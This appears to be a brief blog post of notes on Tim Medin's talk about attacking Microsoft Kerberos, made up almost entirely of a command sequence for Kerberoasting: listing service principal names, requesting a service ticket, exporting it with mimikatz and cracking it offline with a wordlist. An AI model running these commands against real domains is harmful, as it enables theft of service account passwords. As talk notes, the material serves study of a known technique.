---
layout: post
title: "Attacking Microsoft KerberosKicking the Guide Dog of hades"
date: 2017-02-21 10:06:24 +0900
comments: true
categories: 
---

Tim Medin 의 talk.

```
PS> setspn -T medin.local -F -Q */*
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"

mimikatz # kerberos::list /export

$ tgsrepcrack.py wordlist.txt *.kirbi
```
